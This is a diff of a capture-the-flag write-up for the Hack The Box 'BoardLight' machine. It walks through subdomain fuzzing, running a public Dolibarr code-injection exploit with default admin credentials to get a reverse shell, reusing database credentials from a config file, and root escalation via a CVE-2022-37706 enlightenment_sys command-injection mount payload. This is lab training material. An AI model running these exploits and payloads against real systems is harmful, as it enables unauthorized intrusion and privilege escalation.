@@ -1,5 +1,6 @@
 Let's start with nmap_
 
+```
 nmap -A -sC -sV 10.10.11.11
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-23 15:54 CEST
 Nmap scan report for 10.10.11.11
@@ -15,23 +16,28 @@ PORT   STATE SERVICE VERSION
 |_http-title: Site doesn't have a title (text/html; charset=UTF-8).
 |_http-server-header: Apache/2.4.41 (Ubuntu)
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
 
 We find an Apache 2.4 Web server on port 80. The site is really simple with no forms or other way to interact.
 We launch feroxbuster to search files and directories on the website but with no result.
 
 Seems there isn't much we can do here :( So let's try searching subdomains:
 
+```
 ffuf -u http://board.htb/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H "Host: FUZZ.board.htb" 
+```
 
 (filtering with option -fs based on the size of all failed requests)
 
 Wow, we found a crm subdomain. Add it to our /etc/hosts file 
+```
 # Host addresses
 127.0.0.1  localhost
 127.0.1.1  parrot
 10.10.11.25 greenhorn.htb
 10.10.11.11 board.htb
 10.10.11.11 crm.board.htb
+```
 
 And search for it on the browser :).
 
@@ -45,6 +51,7 @@ Then I found online a POC for this PHP code injection: https://github.com/nikn0l
 
 We launch the exploit specifying our target hostname, username, password, our IP, our port (for rev shell on which we are in listening mode -- nc -lnvp 9001)
 
+```
 python3 exploit.py http://crm.board.htb admin admin 10.10.14.152 9001
 [*] Trying authentication...
 [**] Login: admin
@@ -52,12 +59,14 @@ python3 exploit.py http://crm.board.htb admin admin 10.10.14.152 9001
 [*] Trying created site...
 [*] Trying created page...
 [*] Trying editing page and call reverse shell... Press Ctrl+C after successful connection
+```
 
 We got the shell on www-data user!
 
 After some enumeration, using Linpeas and searching in directories we didn't find anything interesting. Then I had an idea, i searched online for
 the path in which config params of Dolibarr are stored and I found juicy infos in them:
 
+```
 www-data@boardlight:~/html/crm.board.htb/htdocs/conf$ cat conf.php
 <?php
 //
@@ -82,6 +91,7 @@ $dolibarr_main_db_character_set='utf8';
 $dolibarr_main_db_collation='utf8_unicode_ci';
 // Authentication settings
 $dolibarr_main_authentication='dolibarr';
+```
 
 Accessing mysql console with these creds we find a table with user rows. We find 2 rows for an admin and a superadmin with 2 hashes.
 I tried to crack them with hashcat with no result. So I had the idea of use the DB passw found in conf file to change user.
@@ -94,15 +104,19 @@ The priv esc part is pretty easy. We upload on the machine linpeas program to en
 
 We find some interesting info in SUID section:
 
+```
 -rwsr-xr-x 1 root root 27K Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys (Unknown SUID binary!)
 -rwsr-xr-x 1 root root 15K Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_ckpasswd (Unknown SUID binary!)
 -rwsr-xr-x 1 root root 15K Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_backlight (Unknown SUID binary!)
 -rwsr-xr-x 1 root root 15K Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/modules/cpufreq/linux-gnu-x86_64-0.23.1/freqset (Unknown SUID binary!)
+```
 
 It is related to some utils called enlightment. Searching online we find the CVE-2022-37706, that shows the program allow local user to gain root privileges
 taking advantage of a not fully secure path check (check that the path starts with /dev/):
 
+```
 ${enlightment_file} /bin/mount -o noexec,nosuid,utf8,nodev,iocharset=utf8,utf8=0,utf8=1,uid=$(id -u), "/dev/../tmp/;/tmp/exploit" /tmp///net
+```
 
 You can find the entire exploit at this link: https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit/tree/main
 
